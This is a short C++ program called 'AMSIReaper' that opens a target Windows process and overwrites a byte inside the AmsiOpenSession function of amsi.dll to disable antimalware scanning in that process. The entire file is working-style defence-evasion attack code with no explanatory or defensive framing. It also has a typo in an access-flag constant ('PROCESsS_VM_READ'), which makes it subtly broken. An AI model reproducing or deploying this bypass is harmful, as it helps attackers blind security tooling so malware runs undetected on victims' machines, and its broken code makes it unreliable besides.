#include <windows.h>
#include <iostream>

class AMSIReaper {
public:
    static HANDLE OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
        return ::OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
    }

    static BOOL WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten) {
        return ::WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
    }

    static BOOL CloseHandle(HANDLE hObject) {
        return ::CloseHandle(hObject);
    }

    static HMODULE LoadLibrary(LPCSTR lpFileName) {
        return ::LoadLibraryA(lpFileName);
    }

    static FARPROC GetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
        return ::GetProcAddress(hModule, lpProcName);
    }
};

int main() {
    DWORD processId = 1234; // Replace with the target process ID
    BYTE patch = 0xEB;

    HANDLE hProcess = AMSIReaper::OpenProcess(PROCESS_VM_OPERATION | PROCESsS_VM_READ | PROCESS_VM_WRITE, FALSE, processId);
    if (hProcess != NULL) {
        HMODULE hAmsiDll = AMSIReaper::LoadLibrary("amsi.dll");
        if (hAmsiDll != NULL) {
            FARPROC pAmsiOpenSession = AMSIReaper::GetProcAddress(hAmsiDll, "AmsiOpenSession");
            if (pAmsiOpenSession != NULL) {
                LPVOID patchAddr = (LPVOID)((uintptr_t)pAmsiOpenSession + 3);
                SIZE_T bytesWritten;
                if (AMSIReaper::WriteProcessMemory(hProcess, patchAddr, &patch, sizeof(patch), &bytesWritten)) {
                    std::cout << "Memory patched successfully!" << std::endl;
                }
            }
        }
        AMSIReaper::CloseHandle(hProcess);
    }

    return 0;
}